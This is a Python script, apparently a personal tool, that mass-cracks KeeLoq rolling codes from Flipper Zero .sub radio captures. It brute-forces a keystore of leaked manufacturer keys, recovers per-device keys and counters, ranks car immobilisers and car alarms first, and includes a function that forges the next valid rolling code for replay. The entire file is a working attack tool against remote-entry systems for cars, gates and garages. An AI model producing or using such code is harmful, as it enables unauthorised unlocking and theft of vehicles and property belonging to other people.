#!/usr/bin/env python3
"""
KeeLoq mass-cracker for Flipper .sub captures.

Faithful offline re-implementation of the Flipper SubGHz KeeLoq read path
(lib/subghz/protocols/keeloq.c + keeloq_common.c). For every `Protocol: KeeLoq`
.sub file found, it:
  * reverses the 64-bit Key, splits FIX (serial+button) / HOP (encrypted),
  * brute-forces every manufacturer key in the plaintext keystore, applying the
    correct learning scheme per key TYPE,
  * validates via the firmware criterion (button match + 8-bit discriminator),
  * recovers the per-device (derived) manufacturer key and the rolling counter.

Automotive hits (OEM immobilisers + aftermarket car alarms) are reported first.

Pure stdlib. No network. Read-only over the filesystem.
"""

import csv
import os
import sys
import time

KEELOQ_NLF = 0x3A5C742E
U32 = 0xFFFFFFFF
U64 = 0xFFFFFFFFFFFFFFFF

# ---- learning type enum (from keeloq_common.h) ---------------------------
T_UNKNOWN = 0
T_SIMPLE = 1
T_NORMAL = 2
T_SECURE = 3
T_MAGIC_XOR_1 = 4
T_FAAC = 5           # no firmware read-case -> skipped
T_MAGIC_SERIAL_1 = 6
T_MAGIC_SERIAL_2 = 7
T_MAGIC_SERIAL_3 = 8
T_BENINCA_ARC = 9    # reserved -> skipped
T_SIMPLE_KINGGATES = 10   # no firmware read-case -> skipped
T_NORMAL_JAROLIFT = 11    # no firmware read-case -> skipped
T_ERREKA = 12
T_PUJOL = 13
T_AERF = 14
T_SIMPLE_JCM = 15

TYPE_NAME = {
    0: "Unknown", 1: "Simple", 2: "Normal", 3: "Secure", 4: "MagicXOR1",
    5: "FAAC(skip)", 6: "MagicSerial1", 7: "MagicSerial2", 8: "MagicSerial3",
    9: "BenincaARC(skip)", 10: "KingGates(skip)", 11: "Jarolift(skip)",
    12: "Erreka", 13: "Pujol", 14: "AERF", 15: "SimpleJCM",
}


# ---- KeeLoq core ---------------------------------------------------------
def keeloq_decrypt(data, key):
    x = data & U32
    for r in range(528):
        nlf_idx = ((x >> 0) & 1) | (((x >> 8) & 1) << 1) | (((x >> 19) & 1) << 2) \
            | (((x >> 25) & 1) << 3) | (((x >> 30) & 1) << 4)
        newbit = ((x >> 31) & 1) ^ ((x >> 15) & 1) ^ ((key >> ((15 - r) & 63)) & 1) \
            ^ ((KEELOQ_NLF >> nlf_idx) & 1)
        x = ((x << 1) & U32) ^ newbit
    return x & U32


def keeloq_encrypt(data, key):
    x = data & U32
    for r in range(528):
        g = ((x >> 1) & 1) | (((x >> 9) & 1) << 1) | (((x >> 20) & 1) << 2) \
            | (((x >> 26) & 1) << 3) | (((x >> 31) & 1) << 4)
        msb = ((x >> 0) & 1) ^ ((x >> 16) & 1) ^ ((key >> (r & 63)) & 1) \
            ^ ((KEELOQ_NLF >> g) & 1)
        x = (x >> 1) ^ (msb << 31)
    return x & U32


def keeloq_forward(fix, man_key, counter, disc10, btn):
    """Generate the next valid rolling code from a recovered device key.
    Returns (hop_encrypted, sub_data64) where sub_data64 is the value to write
    into a Flipper .sub `Key:` field (reverse-key of fix<<32|hop)."""
    plain = ((btn & 0xF) << 28) | ((disc10 & 0x3FF) << 16) | (counter & 0xFFFF)
    hop = keeloq_encrypt(plain, man_key)
    full = ((fix & U32) << 32) | (hop & U32)
    return hop, rev_bits(full, 64)


def rev_bits(key, nbits):
    r = 0
    for i in range(nbits):
        r = (r << 1) | ((key >> i) & 1)
    return r


def byteswap32(v):
    v &= U32
    return ((v & 0xFF) << 24) | ((v & 0xFF00) << 8) | ((v >> 8) & 0xFF00) | ((v >> 24) & 0xFF)


# ---- learning schemes (keeloq_common.c) ----------------------------------
def normal_learning(data, key):
    k1 = keeloq_decrypt((data & 0x0FFFFFFF) | 0x20000000, key)
    k2 = keeloq_decrypt((data & 0x0FFFFFFF) | 0x60000000, key)
    return ((k2 << 32) | k1) & U64


def secure_learning(data, seed, key):
    k1 = keeloq_decrypt(data & 0x0FFFFFFF, key)
    k2 = keeloq_decrypt(seed & U32, key)
    return ((k1 << 32) | k2) & U64


def magic_xor_type1(data, xor):
    d = data & 0x0FFFFFFF
    return (((d << 32) | d) ^ xor) & U64


def magic_serial_type1(data, man):
    d = data & U32
    return ((man & 0xFFFFFFFF) | ((d << 40) & U64)
            | ((((d & 0xFF) + ((d >> 8) & 0xFF)) & 0xFF) << 32)) & U64


def magic_serial_type2(data, man):
    return ((byteswap32(data) << 32) | (man & 0xFFFFFFFF)) & U64


def magic_serial_type3(data, man):
    return ((man & 0xFFFFFFFFFF000000) | (data & 0xFFFFFF)) & U64


def learning_erreka(data, mix, key):
    d = data & 0x0FFFFFFF
    k1 = keeloq_decrypt(d | 0x20000000, key)
    r4 = mix >> 4
    r1 = (mix << 4) & 0xF000F000
    r4 = (r4 & 0x0F000F00) | r1
    r5 = mix & 0x00FF00FF
    x = (r4 | r5) | 0x60000000
    k2 = keeloq_decrypt(x & U32, key)
    return ((k2 << 32) | k1) & U64


def learning_pujol(data, key):
    d = data & 0x0FFFFFFF
    w1 = keeloq_decrypt(d | 0x20000000, key)
    w2 = keeloq_decrypt(d | 0x60000000, key)
    k1 = ((w1 >> 16) | (w1 << 16)) & U32
    k2 = ((w2 >> 16) | (w2 << 16)) & U32
    return ((k2 << 32) | k1) & U64


def _shl32(v, n):
    return (v << n) & U32 if n < 32 else 0


def _shr32(v, n):
    return (v >> n) if n < 32 else 0


def _nl_extend(x, k_lo, k_hi, outer_limit):
    # literal port of subghz_protocol_keeloq_common_manufacturer_nl_extend
    x &= U32
    r4 = outer_limit
    r5 = 0
    r6 = KEELOQ_NLF
    while r5 != r4:
        if r5 < 0x210:
            r1 = (x >> 15) & 1
            r7 = (r1 ^ ((x >> 1) | ((x << 31) & U32))) & U32
            r1 = (15 - r5) & 0x3F
            lr = (32 - r1) & U32
            ip = (r1 - 32) & U32
            lr = _shl32(k_hi, lr)
            r1 = _shr32(k_lo, r1)
            ip = _shr32(k_hi, ip) if r1 < 32 else 0
            r1 = (r1 | lr | ip) & 1
            ip = (x >> 30) & 1
            r1 ^= r7
            r7 = (x >> 25) & 1
            r7 += ip << 1
            ip = (x >> 19) & 1
            ip += r7 << 1
            r7 = (x >> 8) & 1
            r7 += ip << 1
            x &= 1
            x += r7 << 1
            # C: x = (int32_t)r6 >> (x & 31); arithmetic shift, r6 msb is 0 so logical == arithmetic
            x = (r6 >> (x & 31)) & U32
            x &= 1
            x ^= r1
        r5 += 1
    return x  # full 32-bit register (canonical manufacturer_nl_extend returns x; the old `x & 1` broke AERF + derived-decrypt)


def learning_aerf(data, key):
    k_lo = key & U32
    k_hi = (key >> 32) & U32
    d = data & 0x0FFFFFFF
    k1 = _nl_extend(d | 0x20000000, k_lo, k_hi, 0x40)
    k2 = _nl_extend(d | 0x60000000, k_lo, k_hi, 0x40)
    return ((k2 << 32) | k1) & U64


def decrypt_derived(hop, man, outer_limit):
    return _nl_extend(hop, man & U32, (man >> 32) & U32, outer_limit)


# ---- validation ----------------------------------------------------------
def check_decrypt(decrypt, btn, end_serial8):
    if (decrypt >> 28) == btn:
        d8 = (decrypt >> 16) & 0xFF
        if d8 == end_serial8 or d8 == 0:
            return True
    return False


# ---- keystore parsing ----------------------------------------------------
def parse_keystore(path):
    keys = []
    with open(path, "r", encoding="utf-8", errors="replace") as fh:
        for line in fh:
            line = line.strip()
            if not line or line.startswith("#"):
                continue
            if ":" not in line:
                continue
            parts = line.split(":")
            if len(parts) != 3:
                continue
            kh, tp, name = parts
            kh = kh.strip()
            if len(kh) != 16:
                continue
            try:
                k = int(kh, 16)
                t = int(tp.strip())
            except ValueError:
                continue
            keys.append((k, t, name.strip()))
    return keys


# ---- automotive classification of manufacturer names ---------------------
AUTOMOTIVE_EXACT = {
    "Chrysler", "Nissan", "Honda", "Hyundai_Asia", "Toyota", "Suzuki",
    "Mitsubishi", "Daewoo", "KIA", "KIAV5", "KIAV6A", "KIAV6B", "Vag", "Vauweh",
    "VAG_Custom_Seed", "VAG_HELLA_VPM2", "VAG_HELLA_PWM", "Audii", "KGB/Subaru",
    "Magic_1", "Magic_2", "Magic_3", "Magic_4", "Sheriff", "Sherif", "Harpoon",
    "Guard_RF-311A", "Jaguar", "Reef", "Fortress", "Mongoose", "Mongoose_Cenmax",
    "Leopard", "Faraon", "Reff", "Rifcho", "Obama", "Obama2", "Partisan_RX",
    "Rosh", "Pecinin", "Rossi", "GSN", "Lacosta", "Aligofrend", "Steelmate",
    "StarA8A9", "ZX-730-750-1055",
}
AUTOMOTIVE_PREFIX = (
    "Starline", "StarLine", "SL_A", "SL_B", "Tomohawk", "Tomahawk", "Pantera",
    "Cenmax", "Alligator", "Pandora", "APS", "KIA", "Cardot", "Scher",
)


def is_automotive(name):
    if name in AUTOMOTIVE_EXACT:
        return True
    for p in AUTOMOTIVE_PREFIX:
        if name.startswith(p):
            return True
    return False


# ---- .sub parsing --------------------------------------------------------
def parse_sub(path):
    info = {}
    try:
        with open(path, "r", encoding="utf-8", errors="replace") as fh:
            head = fh.read(2048)
    except OSError:
        return None
    if "Protocol: KeeLoq" not in head:
        return None
    for line in head.splitlines():
        if ":" not in line:
            continue
        k, _, v = line.partition(":")
        info[k.strip()] = v.strip()
    key_s = info.get("Key")
    if not key_s:
        return None
    try:
        data = int("".join(key_s.split()), 16)
    except ValueError:
        return None
    bit = int(info.get("Bit", "64"))
    seed = 0
    if info.get("Seed"):
        try:
            seed = int("".join(info["Seed"].split()), 16) & U32
        except ValueError:
            seed = 0
    return {
        "data": data, "bit": bit, "seed": seed,
        "freq": info.get("Frequency", ""), "preset": info.get("Preset", ""),
    }


# ---- crack one capture ---------------------------------------------------
def crack(sub, keys):
    data = sub["data"]
    bit = sub["bit"] or 64
    seed = sub["seed"]
    key = rev_bits(data, bit)
    fix = (key >> 32) & U32
    hop = key & U32
    return crack_fixhop(fix, hop, seed, keys)


def crack_fixhop(fix, hop, seed, keys):
    """Core KeeLoq brute-force given the already-split FIX/HOP words.
    Callable directly by the RAW-demod path (no .sub Key reversal)."""
    fix &= U32
    hop &= U32
    btn = (fix >> 28) & 0xF
    serial28 = fix & 0x0FFFFFFF
    end8 = fix & 0xFF
    disc10 = fix & 0x3FF

    base = {"fix": fix, "hop": hop, "btn": btn, "serial": serial28,
            "end8": end8, "disc10": disc10}

    # Fixed-code style detectors (mirror firmware pre-checks)
    if (hop >> 24) == ((hop >> 16) & 0xFF) and (fix >> 28) == ((hop >> 12) & 0xF) \
            and (hop & 0xFFF) == 0x404:
        return [dict(base, mf="AN-Motors", type=-1, type_name="AN-Motors(fixed)",
                     man_key=0, dev_key=0, decrypt=0, cnt=hop >> 16, conf="fixed")]
    if (hop & 0xFFF) == 0x000 and (fix >> 28) == ((hop >> 12) & 0xF):
        return [dict(base, mf="HCS101", type=-1, type_name="HCS101(fixed)",
                     man_key=0, dev_key=0, decrypt=0, cnt=hop >> 16, conf="fixed")]

    hits = []
    for mkey, mtype, name in keys:
        candidates = []  # (man_used, decrypt)
        if mtype in (T_SIMPLE, T_SIMPLE_JCM):
            candidates.append((mkey, keeloq_decrypt(hop, mkey)))
        elif mtype == T_NORMAL:
            man = normal_learning(fix, mkey)
            candidates.append((man, keeloq_decrypt(hop, man)))
        elif mtype == T_SECURE:
            for sd in (seed, fix & 0x0FFFFFFF, 0):
                man = secure_learning(fix, sd, mkey)
                candidates.append((man, keeloq_decrypt(hop, man)))
        elif mtype == T_MAGIC_XOR_1:
            man = magic_xor_type1(fix, mkey)
            candidates.append((man, keeloq_decrypt(hop, man)))
        elif mtype == T_MAGIC_SERIAL_1:
            man = magic_serial_type1(fix, mkey)
            candidates.append((man, keeloq_decrypt(hop, man)))
        elif mtype == T_MAGIC_SERIAL_2:
            man = magic_serial_type2(fix, mkey)
            candidates.append((man, keeloq_decrypt(hop, man)))
        elif mtype == T_MAGIC_SERIAL_3:
            man = magic_serial_type3(fix, mkey)
            candidates.append((man, keeloq_decrypt(hop, man)))
        elif mtype == T_ERREKA:
            man = learning_erreka(fix, seed, mkey)
            candidates.append((man, keeloq_decrypt(hop, man)))
        elif mtype == T_PUJOL:
            man = learning_pujol(fix, mkey)
            candidates.append((man, keeloq_decrypt(hop, man)))
        elif mtype == T_AERF:
            man = learning_aerf(fix, mkey)
            for lim in (0x240, 0x210):
                candidates.append((man, decrypt_derived(hop, man, lim)))
            candidates.append((man, keeloq_decrypt(hop, man)))
        elif mtype == T_UNKNOWN:
            man_rev = 0
            for i in range(0, 64, 8):
                man_rev |= ((mkey >> i) & 0xFF) << (56 - i)
            candidates.append((mkey, keeloq_decrypt(hop, mkey)))
            candidates.append((man_rev, keeloq_decrypt(hop, man_rev)))
            candidates.append((normal_learning(fix, mkey), 0))
            candidates[-1] = (candidates[-1][0], keeloq_decrypt(hop, candidates[-1][0]))
            candidates.append((normal_learning(fix, man_rev),) )
            candidates[-1] = (candidates[-1][0], keeloq_decrypt(hop, candidates[-1][0]))
            candidates.append((secure_learning(fix, seed, mkey),))
            candidates[-1] = (candidates[-1][0], keeloq_decrypt(hop, candidates[-1][0]))
            candidates.append((magic_xor_type1(fix, mkey),))
            candidates[-1] = (candidates[-1][0], keeloq_decrypt(hop, candidates[-1][0]))
        else:
            continue  # FAAC / KingGates / Jarolift / Beninca -> no firmware read-case

        for man_used, dec in candidates:
            if check_decrypt(dec, btn, end8):
                # confidence: does full 10-bit discriminator match the serial?
                d10 = (dec >> 16) & 0x3FF
                if d10 == disc10:
                    conf = "strong(10-bit)"
                elif ((dec >> 16) & 0xFF) == end8 and end8 != 0:
                    conf = "medium(8-bit)"
                else:
                    conf = "weak(disc=0)"
                hits.append(dict(base, mf=name, type=mtype,
                                 type_name=TYPE_NAME.get(mtype, str(mtype)),
                                 man_key=mkey, dev_key=man_used, decrypt=dec,
                                 cnt=dec & 0xFFFF, conf=conf))
                break  # first matching candidate for this key
    return hits


# ---- filesystem sweep ----------------------------------------------------
def find_keeloq_subs(roots):
    for root in roots:
        for dirpath, _dirs, files in os.walk(root):
            for fn in files:
                if fn.lower().endswith(".sub"):
                    yield os.path.join(dirpath, fn)


CONF_RANK = {"strong(10-bit)": 0, "fixed": 1, "medium(8-bit)": 2, "weak(disc=0)": 3}


def main():
    root = sys.argv[1] if len(sys.argv) > 1 else r"C:\Users\stone"
    keystore = sys.argv[2] if len(sys.argv) > 2 else r"C:\Users\stone\OneDrive\Desktop\fap\keeloq_real_keys.txt"
    outdir = os.path.dirname(os.path.abspath(__file__))

    keys = parse_keystore(keystore)
    n_auto = sum(1 for _k, _t, n in keys if is_automotive(n))
    print(f"[*] keystore: {keystore}")
    print(f"[*] {len(keys)} manufacturer keys ({n_auto} automotive-classed)")
    print(f"[*] scanning {root} for Protocol: KeeLoq .sub files ...")

    t0 = time.time()
    rows = []
    n_files = n_kl = n_cracked = 0
    for path in find_keeloq_subs([root]):
        n_files += 1
        if n_files % 5000 == 0:
            print(f"    ... {n_files} .sub scanned, {n_kl} KeeLoq, "
                  f"{n_cracked} cracked ({time.time()-t0:.0f}s)")
        sub = parse_sub(path)
        if not sub:
            continue
        n_kl += 1
        hits = crack(sub, keys)
        if hits:
            n_cracked += 1
        # keep best hit per file first, plus alternates
        hits.sort(key=lambda h: CONF_RANK.get(h["conf"], 9))
        best = hits[0] if hits else None
        alt = ";".join(sorted({h["mf"] for h in hits[1:]})) if len(hits) > 1 else ""
        rows.append({
            "file": path, "freq": sub["freq"],
            "keyfield": f"{sub['data']:016X}",
            "serial": f"{(best or {}).get('serial', 0):07X}" if best else
                      f"{((rev_bits(sub['data'], sub['bit'] or 64) >> 32) & 0x0FFFFFFF):07X}",
            "btn": (best or {}).get("btn", ""),
            "mf": best["mf"] if best else "UNKNOWN",
            "auto": ("yes" if best and is_automotive(best["mf"]) else
                     ("" if best else "")),
            "scheme": best["type_name"] if best else "",
            "man_key": f"{best['man_key']:016X}" if best and best["man_key"] else "",
            "dev_key": f"{best['dev_key']:016X}" if best and best["dev_key"] else "",
            "counter": f"{best['cnt']:04X}" if best else "",
            "decrypt": f"{best['decrypt']:08X}" if best and best["decrypt"] else "",
            "conf": best["conf"] if best else "",
            "alt_keys": alt,
        })

    dt = time.time() - t0
    print(f"[*] done: {n_files} .sub, {n_kl} KeeLoq, {n_cracked} cracked in {dt:.0f}s")

    # write full CSV
    csv_path = os.path.join(outdir, "keeloq_cracked.csv")
    cols = ["file", "freq", "keyfield", "serial", "btn", "mf", "auto", "scheme",
            "man_key", "dev_key", "counter", "decrypt", "conf", "alt_keys"]
    with open(csv_path, "w", newline="", encoding="utf-8") as fh:
        w = csv.DictWriter(fh, fieldnames=cols)
        w.writeheader()
        w.writerows(rows)
    print(f"[*] CSV  -> {csv_path}")

    # device-level summary (dedupe by mf+serial), automotive first
    from collections import defaultdict
    dev = defaultdict(lambda: {"cnts": set(), "files": 0, "conf": set(),
                               "dev_key": "", "man_key": "", "scheme": "", "freq": set()})
    for r in rows:
        if r["mf"] in ("UNKNOWN",):
            continue
        k = (r["mf"], r["serial"], r["btn"])
        d = dev[k]
        d["files"] += 1
        if r["counter"]:
            d["cnts"].add(r["counter"])
        d["conf"].add(r["conf"])
        d["dev_key"] = r["dev_key"]
        d["man_key"] = r["man_key"]
        d["scheme"] = r["scheme"]
        if r["freq"]:
            d["freq"].add(r["freq"])

    def sort_key(item):
        (mf, serial, btn), _d = item
        return (0 if is_automotive(mf) else 1, mf, serial)

    rep_path = os.path.join(outdir, "keeloq_report.txt")
    with open(rep_path, "w", encoding="utf-8") as fh:
        def out(s=""):
            print(s)
            fh.write(s + "\n")
        out("=" * 78)
        out("KeeLoq mass-crack report")
        out(f"root={root}")
        out(f"keystore={keystore} ({len(keys)} keys)")
        out(f"scanned {n_files} .sub / {n_kl} KeeLoq / {n_cracked} cracked / {dt:.0f}s")
        out("=" * 78)
        for label, want_auto in (("AUTOMOTIVE DEVICES", True),
                                 ("NON-AUTOMOTIVE (gate/garage/alarm/other)", False)):
            items = [it for it in dev.items() if is_automotive(it[0][0]) == want_auto]
            items.sort(key=sort_key)
            out()
            out(f"### {label}  ({len(items)} unique device/serial)")
            out("-" * 78)
            if not items:
                out("  (none)")
            for (mf, serial, btn), d in items:
                cnts = sorted(d["cnts"])
                out(f"  {mf:<22} serial={serial}  btn={btn}  scheme={d['scheme']}")
                out(f"      manufacturer_key={d['man_key']}  derived_device_key={d['dev_key']}")
                out(f"      counters={','.join(cnts) if cnts else '-'}  "
                    f"captures={d['files']}  conf={'/'.join(sorted(d['conf']))}")
    print(f"[*] report -> {rep_path}")


if __name__ == "__main__":
    main()
